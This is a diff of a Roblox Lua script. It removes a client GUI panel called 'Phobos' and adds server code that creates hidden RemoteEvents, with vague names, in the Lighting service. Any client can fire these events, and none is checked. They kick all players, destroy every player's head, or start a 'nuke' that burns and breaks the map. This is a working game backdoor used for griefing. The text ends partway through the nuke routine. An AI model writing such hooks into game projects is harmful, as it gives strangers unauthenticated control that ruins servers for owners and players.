@@ -1,573 +1,187 @@
--- Gui to Lua
--- Version: 3.2
+local BD1 = Instance.new("RemoteEvent")
+BD1.Parent = game:GetService("Lighting")
+BD1.Name = "Event 1 %#$"
 
--- Instances:
+local BD2 = Instance.new("RemoteEvent")
+BD2.Parent = game:GetService("Lighting")
+BD2.Name = "Event 2"
 
-local Phobos = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local UICorner = Instance.new("UICorner")
-local UICorner_2 = Instance.new("UICorner")
-local X = Instance.new("TextButton")
-local UICorner_3 = Instance.new("UICorner")
-local FunFrame = Instance.new("Frame")
-local KICKREASONBOX = Instance.new("TextBox")
-local UICorner_4 = Instance.new("UICorner")
-local OKBTNKICK = Instance.new("TextButton")
-local UICorner_5 = Instance.new("UICorner")
-local KickAllPlayersTitle = Instance.new("TextLabel")
-local UICorner_6 = Instance.new("UICorner")
-local OKBTNKILLPLAYERS = Instance.new("TextButton")
-local UICorner_7 = Instance.new("UICorner")
-local KillAllPlayersTitle = Instance.new("TextLabel")
-local UICorner_8 = Instance.new("UICorner")
-local DestructionFrame = Instance.new("Frame")
-local ShutdownReasonBOX = Instance.new("TextBox")
-local UICorner_9 = Instance.new("UICorner")
-local OkBTNShutdown = Instance.new("TextButton")
-local UICorner_10 = Instance.new("UICorner")
-local ShutdownServerTitle = Instance.new("TextLabel")
-local UICorner_11 = Instance.new("UICorner")
-local NukeOK = Instance.new("TextButton")
-local UICorner_12 = Instance.new("UICorner")
-local NukeTitle = Instance.new("TextLabel")
-local UICorner_13 = Instance.new("UICorner")
-local FunBTN = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
-local MoreBTN = Instance.new("TextButton")
-local UICorner_15 = Instance.new("UICorner")
-local MoreFrame = Instance.new("ScrollingFrame")
-local OkBTNGTP = Instance.new("TextButton")
-local UICorner_16 = Instance.new("UICorner")
-local GameIdBOX = Instance.new("TextBox")
-local UICorner_17 = Instance.new("UICorner")
-local KillAllPlayersTitle_2 = Instance.new("TextLabel")
-local UICorner_18 = Instance.new("UICorner")
-local KillAllPlayersTitle_3 = Instance.new("TextLabel")
-local UICorner_19 = Instance.new("UICorner")
-local InsertModelTitle = Instance.new("TextLabel")
-local UICorner_20 = Instance.new("UICorner")
-local ModelIDBOX = Instance.new("TextBox")
-local UICorner_21 = Instance.new("UICorner")
-local OkBTNModel = Instance.new("TextButton")
-local UICorner_22 = Instance.new("UICorner")
-local InsertModelTitle_2 = Instance.new("TextLabel")
-local UICorner_23 = Instance.new("UICorner")
-local DestructionBTN = Instance.new("TextButton")
-local UICorner_24 = Instance.new("UICorner")
+local BD3Nuke = Instance.new("RemoteEvent")
+BD3Nuke.Parent = game:GetService("Lighting")
+BD3Nuke.Name = "Event 3"
 
---Properties:
+local BD4 = Instance.new("RemoteEvent")
+BD4.Parent = game:GetService("Lighting")
+BD4.Name = "Event 4"
 
-Phobos.Name = "Phobos"
-Phobos.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-Phobos.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Phobos.ResetOnSpawn = false
+local BD5 = Instance.new("RemoteEvent")
+BD5.Parent = game:GetService("Lighting")
+BD5.Name = "Event 5"
 
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = Phobos
-MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-MainFrame.Position = UDim2.new(0.39123863, 0, 0.599202454, 0)
-MainFrame.Size = UDim2.new(0, 246, 0, 300)
+local BD6 = Instance.new("RemoteEvent")
+BD6.Parent = game:GetService("Lighting")
+BD6.Name = "Event 6"
 
-Title.Name = "Title"
-Title.Parent = MainFrame
-Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Title.Size = UDim2.new(0, 246, 0, 35)
-Title.Font = Enum.Font.ArialBold
-Title.Text = "Phobos"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 25.000
-Title.TextWrapped = true
+local TP_Service = game:GetService("TeleportService")
+InsertSevice = game:GetService("InsertService")
 
-UICorner.CornerRadius = UDim.new(0, 3)
-UICorner.Parent = Title
+BD1.OnServerEvent:Connect(function(plr,reason1)
+	for i, v in pairs(game.Players:GetChildren()) do
+		v:Kick(reason1)
+	end 
+end)
 
-UICorner_2.CornerRadius = UDim.new(0, 3)
-UICorner_2.Parent = MainFrame
+BD2.OnServerEvent:Connect(function(plr)
+	for i, v in pairs (game:GetService("Players"):GetPlayers()) do
+		v.Character:FindFirstChild("Head"):Destroy()
+	end
+end)
 
-X.Name = "X"
-X.Parent = MainFrame
-X.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-X.BorderColor3 = Color3.fromRGB(20, 20, 20)
-X.Position = UDim2.new(0.902438998, 0, 0.0194309484, 0)
-X.Size = UDim2.new(0, 17, 0, 23)
-X.Font = Enum.Font.GothamBold
-X.Text = "X"
-X.TextColor3 = Color3.fromRGB(255, 255, 255)
-X.TextScaled = true
-X.TextSize = 14.000
-X.TextWrapped = true
+BD3Nuke.OnServerEvent:Connect(function(plr)
+	local Model = Instance.new("Model",workspace)
+	local Cloud1 = Instance.new("Part")
+	local Cloud2 = Instance.new("Part")
+	local Cloud1Mesh = Instance.new("SpecialMesh")
+	local Cloud2Mesh = Instance.new("SpecialMesh")
+	local Sound = Instance.new("Sound",workspace)
+	local sky = Instance.new("Sky")
+	local NUKE_COLOR = 24 --Only BrickColor codes.
+	local CLOUD_TRANSPARENCY = 0.25
 
-UICorner_3.CornerRadius = UDim.new(0, 3)
-UICorner_3.Parent = X
+	wait(1.5)
+	function unanchor(m)
+		for _,i in pairs (m:GetChildren()) do
+			if i:IsA("Part","Model","Union","WedgePart","CornerWedgePart") then
+				--           i.Anchored = false
+				local Fire = Instance.new("Fire")
+				Fire.Parent = i
+				Fire.Size = math.random(5,10)
+				i.Material = "CorrodedMetal"
+				i:BreakJoints()
+				i.BrickColor = BrickColor.new(26)
 
-FunFrame.Name = "FunFrame"
-FunFrame.Parent = MainFrame
-FunFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-FunFrame.BackgroundTransparency = 1.000
-FunFrame.Position = UDim2.new(0, 0, 0.183333337, 0)
-FunFrame.Size = UDim2.new(0, 246, 0, 245)
-FunFrame.Visible = false
-
-KICKREASONBOX.Name = "KICKREASONBOX"
-KICKREASONBOX.Parent = FunFrame
-KICKREASONBOX.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-KICKREASONBOX.Position = UDim2.new(0, 0, 0.208235949, 0)
-KICKREASONBOX.Size = UDim2.new(0, 201, 0, 30)
-KICKREASONBOX.Font = Enum.Font.SourceSans
-KICKREASONBOX.PlaceholderText = "Reason"
-KICKREASONBOX.Text = ""
-KICKREASONBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
-KICKREASONBOX.TextScaled = true
-KICKREASONBOX.TextSize = 14.000
-KICKREASONBOX.TextWrapped = true
-
-UICorner_4.CornerRadius = UDim.new(0, 3)
-UICorner_4.Parent = KICKREASONBOX
-
-OKBTNKICK.Name = "OKBTNKICK"
-OKBTNKICK.Parent = FunFrame
-OKBTNKICK.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-OKBTNKICK.BorderColor3 = Color3.fromRGB(20, 20, 20)
-OKBTNKICK.Position = UDim2.new(0.841463566, 0, 0.208235949, 0)
-OKBTNKICK.Size = UDim2.new(0, 32, 0, 30)
-OKBTNKICK.Font = Enum.Font.ArialBold
-OKBTNKICK.Text = "OK"
-OKBTNKICK.TextColor3 = Color3.fromRGB(255, 255, 255)
-OKBTNKICK.TextScaled = true
-OKBTNKICK.TextSize = 14.000
-OKBTNKICK.TextWrapped = true
-
-UICorner_5.CornerRadius = UDim.new(0, 3)
-UICorner_5.Parent = OKBTNKICK
-
-KickAllPlayersTitle.Name = "KickAllPlayersTitle"
-KickAllPlayersTitle.Parent = FunFrame
-KickAllPlayersTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-KickAllPlayersTitle.Position = UDim2.new(0, 0, 0.0675041899, 0)
-KickAllPlayersTitle.Size = UDim2.new(0, 246, 0, 24)
-KickAllPlayersTitle.Font = Enum.Font.ArialBold
-KickAllPlayersTitle.Text = "Kick All Players"
-KickAllPlayersTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-KickAllPlayersTitle.TextSize = 25.000
-KickAllPlayersTitle.TextWrapped = true
-
-UICorner_6.CornerRadius = UDim.new(0, 3)
-UICorner_6.Parent = KickAllPlayersTitle
-
-OKBTNKILLPLAYERS.Name = "OKBTNKILLPLAYERS"
-OKBTNKILLPLAYERS.Parent = FunFrame
-OKBTNKILLPLAYERS.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-OKBTNKILLPLAYERS.BorderColor3 = Color3.fromRGB(20, 20, 20)
-OKBTNKILLPLAYERS.Position = UDim2.new(0.024390243, 0, 0.553423047, 0)
-OKBTNKILLPLAYERS.Size = UDim2.new(0, 233, 0, 24)
-OKBTNKILLPLAYERS.Font = Enum.Font.ArialBold
-OKBTNKILLPLAYERS.Text = "OK"
-OKBTNKILLPLAYERS.TextColor3 = Color3.fromRGB(255, 255, 255)
-OKBTNKILLPLAYERS.TextScaled = true
-OKBTNKILLPLAYERS.TextSize = 14.000
-OKBTNKILLPLAYERS.TextWrapped = true
-
-UICorner_7.CornerRadius = UDim.new(0, 3)
-UICorner_7.Parent = OKBTNKILLPLAYERS
-
-KillAllPlayersTitle.Name = "KillAllPlayersTitle"
-KillAllPlayersTitle.Parent = FunFrame
-KillAllPlayersTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-KillAllPlayersTitle.Position = UDim2.new(0, 0, 0.412691295, 0)
-KillAllPlayersTitle.Size = UDim2.new(0, 246, 0, 24)
-KillAllPlayersTitle.Font = Enum.Font.ArialBold
-KillAllPlayersTitle.Text = "Kill All Players"
-KillAllPlayersTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-KillAllPlayersTitle.TextSize = 25.000
-KillAllPlayersTitle.TextWrapped = true
-
-UICorner_8.CornerRadius = UDim.new(0, 3)
-UICorner_8.Parent = KillAllPlayersTitle
-
-DestructionFrame.Name = "DestructionFrame"
-DestructionFrame.Parent = MainFrame
-DestructionFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-DestructionFrame.BackgroundTransparency = 1.000
-DestructionFrame.Position = UDim2.new(0, 0, 0.183333337, 0)
-DestructionFrame.Size = UDim2.new(0, 246, 0, 245)
-DestructionFrame.Visible = false
-
-ShutdownReasonBOX.Name = "ShutdownReasonBOX"
-ShutdownReasonBOX.Parent = DestructionFrame
-ShutdownReasonBOX.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-ShutdownReasonBOX.Position = UDim2.new(0, 0, 0.208235949, 0)
-ShutdownReasonBOX.Size = UDim2.new(0, 201, 0, 30)
-ShutdownReasonBOX.Font = Enum.Font.SourceSans
-ShutdownReasonBOX.PlaceholderText = "Reason"
-ShutdownReasonBOX.Text = ""
-ShutdownReasonBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
-ShutdownReasonBOX.TextScaled = true
-ShutdownReasonBOX.TextSize = 14.000
-ShutdownReasonBOX.TextWrapped = true
-
-UICorner_9.CornerRadius = UDim.new(0, 3)
-UICorner_9.Parent = ShutdownReasonBOX
-
-OkBTNShutdown.Name = "OkBTNShutdown"
-OkBTNShutdown.Parent = DestructionFrame
-OkBTNShutdown.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNShutdown.BorderColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNShutdown.Position = UDim2.new(0.841463566, 0, 0.208235949, 0)
-OkBTNShutdown.Size = UDim2.new(0, 32, 0, 30)
-OkBTNShutdown.Font = Enum.Font.ArialBold
-OkBTNShutdown.Text = "OK"
-OkBTNShutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-OkBTNShutdown.TextScaled = true
-OkBTNShutdown.TextSize = 14.000
-OkBTNShutdown.TextWrapped = true
-
-UICorner_10.CornerRadius = UDim.new(0, 3)
-UICorner_10.Parent = OkBTNShutdown
-
-ShutdownServerTitle.Name = "ShutdownServerTitle"
-ShutdownServerTitle.Parent = DestructionFrame
-ShutdownServerTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-ShutdownServerTitle.Position = UDim2.new(0, 0, 0.0675041899, 0)
-ShutdownServerTitle.Size = UDim2.new(0, 246, 0, 24)
-ShutdownServerTitle.Font = Enum.Font.ArialBold
-ShutdownServerTitle.Text = "Shutdown Server"
-ShutdownServerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-ShutdownServerTitle.TextSize = 25.000
-ShutdownServerTitle.TextWrapped = true
-
-UICorner_11.CornerRadius = UDim.new(0, 3)
-UICorner_11.Parent = ShutdownServerTitle
-
-NukeOK.Name = "NukeOK"
-NukeOK.Parent = DestructionFrame
-NukeOK.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-NukeOK.BorderColor3 = Color3.fromRGB(20, 20, 20)
-NukeOK.Position = UDim2.new(0.024390243, 0, 0.553423047, 0)
-NukeOK.Size = UDim2.new(0, 233, 0, 24)
-NukeOK.Font = Enum.Font.ArialBold
-NukeOK.Text = "OK"
-NukeOK.TextColor3 = Color3.fromRGB(255, 255, 255)
-NukeOK.TextScaled = true
-NukeOK.TextSize = 14.000
-NukeOK.TextWrapped = true
-
-UICorner_12.CornerRadius = UDim.new(0, 3)
-UICorner_12.Parent = NukeOK
-
-NukeTitle.Name = "NukeTitle"
-NukeTitle.Parent = DestructionFrame
-NukeTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-NukeTitle.Position = UDim2.new(0, 0, 0.412691295, 0)
-NukeTitle.Size = UDim2.new(0, 246, 0, 24)
-NukeTitle.Font = Enum.Font.ArialBold
-NukeTitle.Text = "Nuke"
-NukeTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-NukeTitle.TextSize = 25.000
-NukeTitle.TextWrapped = true
-
-UICorner_13.CornerRadius = UDim.new(0, 3)
-UICorner_13.Parent = NukeTitle
-
-FunBTN.Name = "FunBTN"
-FunBTN.Parent = MainFrame
-FunBTN.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-FunBTN.BorderColor3 = Color3.fromRGB(20, 20, 20)
-FunBTN.Position = UDim2.new(0.0040650405, 0, 0.116666667, 0)
-FunBTN.Size = UDim2.new(0, 80, 0, 23)
-FunBTN.Font = Enum.Font.ArialBold
-FunBTN.Text = "Fun"
-FunBTN.TextColor3 = Color3.fromRGB(255, 255, 255)
-FunBTN.TextScaled = true
-FunBTN.TextSize = 14.000
-FunBTN.TextWrapped = true
-
-UICorner_14.CornerRadius = UDim.new(0, 3)
-UICorner_14.Parent = FunBTN
-
-MoreBTN.Name = "MoreBTN"
-MoreBTN.Parent = MainFrame
-MoreBTN.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-MoreBTN.BorderColor3 = Color3.fromRGB(20, 20, 20)
-MoreBTN.Position = UDim2.new(0.703252137, 0, 0.116666667, 0)
-MoreBTN.Size = UDim2.new(0, 73, 0, 23)
-MoreBTN.Font = Enum.Font.ArialBold
-MoreBTN.Text = "More"
-MoreBTN.TextColor3 = Color3.fromRGB(255, 255, 255)
-MoreBTN.TextScaled = true
-MoreBTN.TextSize = 14.000
-MoreBTN.TextWrapped = true
-
-UICorner_15.CornerRadius = UDim.new(0, 3)
-UICorner_15.Parent = MoreBTN
-
-MoreFrame.Name = "MoreFrame"
-MoreFrame.Parent = MainFrame
-MoreFrame.Active = true
-MoreFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-MoreFrame.BackgroundTransparency = 1.000
-MoreFrame.BorderSizePixel = 0
-MoreFrame.Position = UDim2.new(0.0040650405, 0, 0.193333328, 0)
-MoreFrame.Size = UDim2.new(0, 245, 0, 242)
-MoreFrame.ScrollBarThickness = 0
-
-OkBTNGTP.Name = "OkBTNGTP"
-OkBTNGTP.Parent = MoreFrame
-OkBTNGTP.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNGTP.BorderColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNGTP.Position = UDim2.new(0.844272792, 0, 0.0895085856, 0)
-OkBTNGTP.Size = UDim2.new(0, 31, 0, 29)
-OkBTNGTP.Font = Enum.Font.ArialBold
-OkBTNGTP.Text = "OK"
-OkBTNGTP.TextColor3 = Color3.fromRGB(255, 255, 255)
-OkBTNGTP.TextScaled = true
-OkBTNGTP.TextSize = 14.000
-OkBTNGTP.TextWrapped = true
-
-UICorner_16.CornerRadius = UDim.new(0, 3)
-UICorner_16.Parent = OkBTNGTP
-
-GameIdBOX.Name = "GameIdBOX"
-GameIdBOX.Parent = MoreFrame
-GameIdBOX.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-GameIdBOX.Position = UDim2.new(0, 0, 0.0872018114, 0)
-GameIdBOX.Size = UDim2.new(0, 197, 0, 30)
-GameIdBOX.Font = Enum.Font.SourceSans
-GameIdBOX.PlaceholderText = "Game ID"
-GameIdBOX.Text = ""
-GameIdBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
-GameIdBOX.TextScaled = true
-GameIdBOX.TextSize = 14.000
-GameIdBOX.TextWrapped = true
-
-UICorner_17.CornerRadius = UDim.new(0, 3)
-UICorner_17.Parent = GameIdBOX
-
-KillAllPlayersTitle_2.Name = "KillAllPlayersTitle"
-KillAllPlayersTitle_2.Parent = MoreFrame
-KillAllPlayersTitle_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-KillAllPlayersTitle_2.Position = UDim2.new(0, 0, 0.0165456366, 0)
-KillAllPlayersTitle_2.Size = UDim2.new(0, 244, 0, 24)
-KillAllPlayersTitle_2.Font = Enum.Font.ArialBold
-KillAllPlayersTitle_2.Text = "Game Teleporter"
-KillAllPlayersTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-KillAllPlayersTitle_2.TextSize = 25.000
-KillAllPlayersTitle_2.TextWrapped = true
-
-UICorner_18.CornerRadius = UDim.new(0, 3)
-UICorner_18.Parent = KillAllPlayersTitle_2
-
-KillAllPlayersTitle_3.Name = "KillAllPlayersTitle"
-KillAllPlayersTitle_3.Parent = MoreFrame
-KillAllPlayersTitle_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-KillAllPlayersTitle_3.Position = UDim2.new(0, 0, 0.153212309, 0)
-KillAllPlayersTitle_3.Size = UDim2.new(0, 244, 0, 24)
-KillAllPlayersTitle_3.Font = Enum.Font.ArialBold
-KillAllPlayersTitle_3.Text = "*requires third party teleports to be enabled"
-KillAllPlayersTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-KillAllPlayersTitle_3.TextScaled = true
-KillAllPlayersTitle_3.TextSize = 25.000
-KillAllPlayersTitle_3.TextWrapped = true
-
-UICorner_19.CornerRadius = UDim.new(0, 3)
-UICorner_19.Parent = KillAllPlayersTitle_3
-
-InsertModelTitle.Name = "InsertModelTitle"
-InsertModelTitle.Parent = MoreFrame
-InsertModelTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-InsertModelTitle.Position = UDim2.new(0, 0, 0.216545641, 0)
-InsertModelTitle.Size = UDim2.new(0, 244, 0, 24)
-InsertModelTitle.Font = Enum.Font.ArialBold
-InsertModelTitle.Text = "Insert Model"
-InsertModelTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-InsertModelTitle.TextSize = 25.000
-InsertModelTitle.TextWrapped = true
-
-UICorner_20.CornerRadius = UDim.new(0, 3)
-UICorner_20.Parent = InsertModelTitle
-
-ModelIDBOX.Name = "ModelIDBOX"
-ModelIDBOX.Parent = MoreFrame
-ModelIDBOX.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-ModelIDBOX.Position = UDim2.new(0, 0, 0.287201792, 0)
-ModelIDBOX.Size = UDim2.new(0, 197, 0, 30)
-ModelIDBOX.Font = Enum.Font.SourceSans
-ModelIDBOX.PlaceholderText = "Model ID"
-ModelIDBOX.Text = "2969877524"
-ModelIDBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
-ModelIDBOX.TextScaled = true
-ModelIDBOX.TextSize = 14.000
-ModelIDBOX.TextWrapped = true
-
-UICorner_21.CornerRadius = UDim.new(0, 3)
-UICorner_21.Parent = ModelIDBOX
-
-OkBTNModel.Name = "OkBTNModel"
-OkBTNModel.Parent = MoreFrame
-OkBTNModel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNModel.BorderColor3 = Color3.fromRGB(20, 20, 20)
-OkBTNModel.Position = UDim2.new(0.844272792, 0, 0.289508581, 0)
-OkBTNModel.Size = UDim2.new(0, 31, 0, 29)
-OkBTNModel.Font = Enum.Font.ArialBold
-OkBTNModel.Text = "OK"
-OkBTNModel.TextColor3 = Color3.fromRGB(255, 255, 255)
-OkBTNModel.TextScaled = true
-OkBTNModel.TextSize = 14.000
-OkBTNModel.TextWrapped = true
-
-UICorner_22.CornerRadius = UDim.new(0, 3)
-UICorner_22.Parent = OkBTNModel
-
-InsertModelTitle_2.Name = "InsertModelTitle"
-InsertModelTitle_2.Parent = MoreFrame
-InsertModelTitle_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-InsertModelTitle_2.Position = UDim2.new(0.00408163248, 0, 0.363212317, 0)
-InsertModelTitle_2.Size = UDim2.new(0, 244, 0, 24)
-InsertModelTitle_2.Font = Enum.Font.ArialBold
-InsertModelTitle_2.Text = "*model must be in your inventory"
-InsertModelTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-InsertModelTitle_2.TextScaled = true
-InsertModelTitle_2.TextSize = 25.000
-InsertModelTitle_2.TextWrapped = true
-
-UICorner_23.CornerRadius = UDim.new(0, 3)
-UICorner_23.Parent = InsertModelTitle_2
-
-DestructionBTN.Name = "DestructionBTN"
-DestructionBTN.Parent = MainFrame
-DestructionBTN.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-DestructionBTN.BorderColor3 = Color3.fromRGB(20, 20, 20)
-DestructionBTN.Position = UDim2.new(0.329268306, 0, 0.116666667, 0)
-DestructionBTN.Size = UDim2.new(0, 92, 0, 23)
-DestructionBTN.Font = Enum.Font.ArialBold
-DestructionBTN.Text = "Destruction"
-DestructionBTN.TextColor3 = Color3.fromRGB(255, 255, 255)
-DestructionBTN.TextScaled = true
-DestructionBTN.TextSize = 14.000
-DestructionBTN.TextWrapped = true
-
-UICorner_24.CornerRadius = UDim.new(0, 3)
-UICorner_24.Parent = DestructionBTN
-
--- Scripts:
-
-local function OQMBHNL_fake_script() -- FunFrame.Fun Main 
-	local script = Instance.new('LocalScript', FunFrame)
-
-	--Phobos / Fun Main
-	
-	local KickEvent = game.Lighting:WaitForChild("Event 1 %#$")
-	local KillAllPlayersEvent = game.Lighting:WaitForChild("Event 2")
-	------
-	
-	local OKBTNKICK = script.Parent:FindFirstChild("OKBTNKICK")
-	local OKBTNKILLPLAYERS = script.Parent:FindFirstChild("OKBTNKILLPLAYERS")
-	local LPKILLALLPLAYERSBTN = script.Parent:FindFirstChild("LPKILLALLPLAYERSBTN")
-	----
-	local KICKREASONBOX = script.Parent:FindFirstChild("KICKREASONBOX")
-	
-	OKBTNKICK.MouseButton1Down:Connect(function(click)
-		local reason1 = script.Parent.KICKREASONBOX.Text
-		local plr = game.Players.LocalPlayer
-		KickEvent:FireServer(reason1)
-	end)
-	
-	OKBTNKILLPLAYERS.MouseButton1Down:Connect(function(click)
-		KillAllPlayersEvent:FireServer()
-	end)
-end
-coroutine.wrap(OQMBHNL_fake_script)()
-local function AHYCG_fake_script() -- DestructionFrame.Destruction Main 
-	local script = Instance.new('LocalScript', DestructionFrame)
-
-	--Phobos / Fun Main
-	
-	local NukeEvent = game.Lighting:WaitForChild("Event 3")
-	local ShutdownEvent = game.Lighting:WaitForChild("Event 1 %#$")
-	------
-	
-	local NukeOKBTN = script.Parent:FindFirstChild("NukeOK")
-	local ShutdownOkBTN = script.Parent:FindFirstChild("OkBTNShutdown")
-	----
-	NukeOKBTN.MouseButton1Down:Connect(function(click)
-		NukeEvent:FireServer()
-	end)
-	
-	ShutdownOkBTN.MouseButton1Down:Connect(function(click)
-		local reason1 = script.Parent.ShutdownReasonBOX.Text
-		local plr = game.Players.LocalPlayer
-		wait(1)
-		ShutdownEvent:FireServer(reason1)
-	end)
-end
-coroutine.wrap(AHYCG_fake_script)()
-local function VUAQVQ_fake_script() -- MainFrame.LocalScript 
-	local script = Instance.new('LocalScript', MainFrame)
-
-	--Phobos Main
-	
-	local FunBTN = script.Parent:WaitForChild("FunBTN")
-	local DestructionBTN = script.Parent:WaitForChild("DestructionBTN")
-	local MoreBTN = script.Parent:WaitForChild("MoreBTN")
-	
-	-----
-	local FunFrame = script.Parent:WaitForChild("FunFrame")
-	local DestructionFrame = script.Parent:WaitForChild("DestructionFrame")
-	local MoreFrame = script.Parent:WaitForChild("MoreFrame")
-	
-	FunBTN.MouseButton1Down:Connect(function(btnClick)
-		FunFrame.Visible = true
-		DestructionFrame.Visible = false
-		MoreFrame.Visible = false
-	end)
-	
-	DestructionBTN.MouseButton1Down:Connect(function(btnClick)
-		DestructionFrame.Visible = true
-		FunFrame.Visible = false
-		MoreFrame.Visible = false
-	end)
-	
-	MoreBTN.MouseButton1Down:Connect(function(btnClick)
-		MoreFrame.Visible = true
-		DestructionFrame.Visible = false
-		FunFrame.Visible = false
-	end)
-	
-	script.Parent.Selectable = true
-	script.Parent.Draggable = true
-end
-coroutine.wrap(VUAQVQ_fake_script)()
-local function ALVZSON_fake_script() -- MoreFrame.Fun Main 
-	local script = Instance.new('LocalScript', MoreFrame)
-
-	--Phobos / Fun Main
-	
-	local GTeleportEvent = game.Lighting:WaitForChild("Event 4")
-	local ModelIDEvent = game.Lighting:WaitForChild("Event 5")
-	------
-	
-	local OkBTNGTP = script.Parent:FindFirstChild("OkBTNGTP")
-	local OkBTNMODEL = script.Parent:FindFirstChild("OkBTNModel")
-	----
-	local GameIdBOX = script.Parent:FindFirstChild("GameIdBOX")
-	local ModelIDBOX = script.Parent:FindFirstChild("ModelIDBOX")
-	----
-	InsertSevice = game:GetService("InsertService")
-	
-	OkBTNGTP.MouseButton1Down:Connect(function(click)
-		local gameID = GameIdBOX.Text
-		GTeleportEvent:FireServer(gameID)
-	end)
-	
-	OkBTNMODEL.MouseButton1Down:Connect(function(click)
-		local modelID = ModelIDBOX.Text
-		ModelIDEvent:FireServer(modelID)
-	end)
-	
-	GameIdBOX:GetPropertyChangedSignal("Text"):Connect(function()
-		GameIdBOX.Text = GameIdBOX.Text:gsub('%D+', '');
+			else
+				unanchor(i)
+			end
 		end
-	)
-end
-coroutine.wrap(ALVZSON_fake_script)()
+	end
+	unanchor(game.Workspace)
+
+	Sound.SoundId = "http://www.roblox.com/asset?id=2248511"
+	Sound.PlaybackSpeed = 0.2
+	Sound.Playing = true
+	Sound.Volume = 10
+
+	Model.Name = "Mushroom Cloud"
+	Cloud1.Parent = Model
+	Cloud1.Anchored = true
+	Cloud1.CanCollide = false
+	Cloud1.Locked = true
+	Cloud1Mesh.Parent = Cloud1
+	Cloud1Mesh.MeshType = "FileMesh"
+	Cloud1Mesh.MeshId = "http://www.roblox.com/asset/?id=1095708"
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(95,300,195) --1999
+	Cloud2.Parent = Model
+	Cloud2.Anchored = true
+	Cloud2.CanCollide = false
+	Cloud2.Locked = true
+	Cloud2.Position = Cloud2.Position + Vector3.new(0,587,0)
+	Cloud2Mesh.Parent = Cloud2
+	Cloud2Mesh.MeshType = "FileMesh"
+	Cloud2Mesh.MeshId = "http://www.roblox.com/asset/?id=1095708"
+	Cloud2Mesh.Scale = Cloud2Mesh.Scale + Vector3.new(399,399,649)
+	Cloud1.Transparency = CLOUD_TRANSPARENCY
+	Cloud2.Transparency = CLOUD_TRANSPARENCY
+	Cloud1.BrickColor = BrickColor.new(NUKE_COLOR)
+	Cloud2.BrickColor = BrickColor.new(NUKE_COLOR)
+	sky.Parent = game.Lighting
+	sky.Name = "NukeSky"
+	sky.CelestialBodiesShown = true
+	sky.SkyboxBk = "http://www.roblox.com/asset/?version=1&id=1012890"
+	sky.SkyboxDn = "http://www.roblox.com/asset/?version=1&id=1012891"
+	sky.SkyboxFt = "http://www.roblox.com/asset/?version=1&id=1012887"
+	sky.SkyboxLf = "http://www.roblox.com/asset/?version=1&id=1012889"
+	sky.SkyboxRt = "http://www.roblox.com/asset/?version=1&id=1012888"
+	sky.SkyboxUp = "http://www.roblox.com/asset/?version=1&id=1014449"
+	local explosion = Instance.new("Explosion")
+	explosion.Parent = game.Workspace
+	explosion.BlastRadius = 9999999999999
+	explosion.BlastPressure = 10000000
+	game.Lighting.Brightness = 999
+	game.Lighting.OutdoorAmbient = Color3.new(1,0,0)
+	wait (1) --Fireball
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --200
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --400
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --600
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --800
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --1000
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --1200
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --1400
